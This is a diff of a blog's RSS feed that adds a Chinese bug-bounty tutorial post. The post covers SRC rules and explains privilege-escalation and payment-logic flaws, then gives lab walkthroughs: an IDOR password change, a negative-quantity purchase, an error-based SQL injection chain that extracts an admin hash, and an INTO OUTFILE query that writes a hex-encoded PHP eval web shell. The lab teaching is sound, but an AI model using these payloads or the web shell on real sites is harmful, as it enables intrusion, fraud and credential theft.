@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Thu, 29 Jan 2026 19:18:27 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 30 Jan 2026 20:41:45 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>恰到好处的补完—《轻音少女》观后感</title>
         <link>https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/</link>
         <pubDate>Sat, 01 Nov 2025 09:58:38 +0800</pubDate>
@@ -89,6 +89,135 @@
 &gt;&lt;/p&gt;
 &lt;center&gt;最后一次在学园祭上演出完的众人&lt;/center&gt;
 </description>
+        </item>
+        <item>
+        <title>1.30 漏洞挖掘</title>
+        <link>https://www.retr0.xyz/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
+        <pubDate>Fri, 30 Jan 2026 20:41:45 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
+        <description>&lt;h2 id=&#34;挖洞规则不是渗透&#34;&gt;挖洞规则（不是渗透）
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;bug hunter vs pentest&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;什么是SRC？&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Security Response Center 安全应急响应中心&lt;/p&gt;
+&lt;p&gt;现在市面上存在了各种厂商的安全应急响应中心：&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/src/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.anquanke.com/src/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。&lt;/p&gt;
+&lt;p&gt;详细阅读测试范围，不要超出，会有非法测试的风险。&lt;/p&gt;
+&lt;p&gt;遵循安全测试规范，比如sql注入会有要求，哪些东西不能读取，最多读取多少条。&lt;/p&gt;
+&lt;p&gt;挖到数据库，只需要读取一两条证明。&lt;/p&gt;
+&lt;p&gt;不要使用自动化工具，sqlmap（自动化软件有可能会造成不可预料的后果，比如删库） 条件允许测试越权漏洞，注册2个+账号，不要涉及在线用户。&lt;/p&gt;
+&lt;p&gt;大多数厉害网站一般都会出现越权注销功能（很多短信轰炸）&lt;/p&gt;
+&lt;p&gt;购物网站0元购或者积分，不会承认，让他发货，你再提交 xss漏洞，在线xss平台（不要用），自己搭建&lt;/p&gt;
+&lt;p&gt;情报漏洞不要做： 某公司业务有漏洞可以删差评，有人进行出售，然后把出售截图提交给公司，公司核实之后支付报酬&lt;/p&gt;
+&lt;p&gt;游戏外挂出售 电商信息出售 刷钻漏洞等 如果可以进而发现漏洞就可以提2次&lt;/p&gt;
+&lt;p&gt;企业内鬼证据、bc网站不要碰（国内，除非你水平特别高）&lt;/p&gt;
+&lt;p&gt;没有授权不要碰，某些奇怪的src不要碰 做一些大的src，挖洞项目，国外挖洞 bat，字节，美团。。。。。 教育src&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;众测：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;（有钱） 漏洞盒子&amp;mdash;-金融&amp;mdash;&amp;ndash;养号&lt;/p&gt;
+&lt;p&gt;补天众测&amp;mdash;-白帽子推荐/前300/挖到5个企业src高危/任意src平台年度top3 补天平台&amp;mdash;-专属src&amp;ndash;政府&lt;/p&gt;
+&lt;p&gt;360众测（门票ctf注册资格，不一定一直有项目）&lt;/p&gt;
+&lt;p&gt;火线平台（比较卷） 雷神众测&amp;mdash;-抢项目&amp;mdash;银行 cve cnvd 编号：（有漏洞变化） cnvd： 三大运营商，国企事业单位 通用性，资产大于等于5000w&lt;/p&gt;
+&lt;h2 id=&#34;概念解释&#34;&gt;概念解释
+&lt;/h2&gt;&lt;h3 id=&#34;越权&#34;&gt;越权
+&lt;/h3&gt;&lt;p&gt;横向越权：同级权限跨越&lt;/p&gt;
+&lt;p&gt;纵向越权：拿到不同级别的权限（如Admin）&lt;/p&gt;
+&lt;p&gt;未授权：在没有做认证的情况下可以做认证后才能做的操作。&lt;/p&gt;
+&lt;h3 id=&#34;支付漏洞&#34;&gt;支付漏洞
+&lt;/h3&gt;&lt;p&gt;支付逻辑常见测试:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;熟悉常见支付流程&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;熟悉那些数据篡改&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;商品ID,购买价格,购买数量,订单属性,折扣属性,支付方式,支付状态等&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;熟悉那些修改方式&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;替换支付,重复支付,最小额支付,负数支付,溢出支付,优惠券支付等&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;熟悉那些另类方法&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;无限试用,越权支付,并发兑换,四舍五入半价购,循环利用优惠券,支付签约逻辑等&lt;/p&gt;
+&lt;h2 id=&#34;靶场实操&#34;&gt;靶场实操
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;安装metinfo这个cms作为靶场：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1NOOP_SuNqeyz2Ld3yQebmg?pwd=8grs&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1NOOP_SuNqeyz2Ld3yQebmg?pwd=8grs&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;越权-1&#34;&gt;越权
+&lt;/h3&gt;&lt;h4 id=&#34;修改他人密码&#34;&gt;修改他人密码
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;横向/纵向越权：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在修改自己密码时抓包，发现数据包中验证用户身份的只有userid这一个，因此我们尝试修改userid的内容为其他用户，甚至是admin，放包。尝试登录发现成功。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Tips：&lt;/strong&gt; 在实操中成功修改admin密码后无法登录通常是因为管理员的登录页面和普通用户不一样。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;未授权：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在修改自己密码时尝试把数据包中的cookie删除，发现密码同样可以删除成功。&lt;/p&gt;
+&lt;h3 id=&#34;支付漏洞-1&#34;&gt;支付漏洞
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;安装easycms：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1a3po_LJ2NeWzDMreN3t2rQ?pwd=2uns&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1a3po_LJ2NeWzDMreN3t2rQ?pwd=2uns&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在购买物品时抓包，发现数据包中并未有价格相关数据，但是又物品id和物品数量，推测网站数据库中将物品id和价格已经绑定。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /index.php?case=archive&amp;amp;act=doorders&amp;amp;aid=83&amp;amp;datatype=&amp;amp;buy=true&amp;amp;thisnum=1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里把&lt;code&gt;thisnum&lt;/code&gt;的值为-100，发现价格变为负数，提交订单后订单显示支付成功，并且余额增加。&lt;/p&gt;
+&lt;h3 id=&#34;sql注入&#34;&gt;sql注入
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;安装BESScms：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1YkAYFphFxb-_7Y4MGZrcbw?pwd=pnfr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1YkAYFphFxb-_7Y4MGZrcbw?pwd=pnfr&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;已知管理员登录界面可以进行sql注入，下面展示注入流程：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,database(),0x7e)))#	//besscms
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables whe where re table_schema like database()),0x7e)))# //bees_admin,bees_admin_group,bee
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns whe where re table_schema like database() a and nd table_name like &amp;#39;bees_admin&amp;#39;),0x7e)))# //id,admin_name,admin_password,ad
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(admin_name) fr from om bees_admin),0x7e)))# 	//admin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),1,15),0x7e)))#
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),16,32),0x7e)))# //21232f297a57a5a743894a0e4a801fc3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们甚至可以不满足于拿到管理员密码，我们尝试注入一句话木马：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;admin&amp;#39;un union ion selselectect 1,2,3,4,0x3c3f706870206576616c28245f504f53545b27313233275d293b3f3e
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; in into outoutfilefile &amp;#39;C:/phpstudy_pro/WWW/test/123.php&amp;#39;#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
         </item>
         <item>
         <title>1.29 misc和流量分析</title>
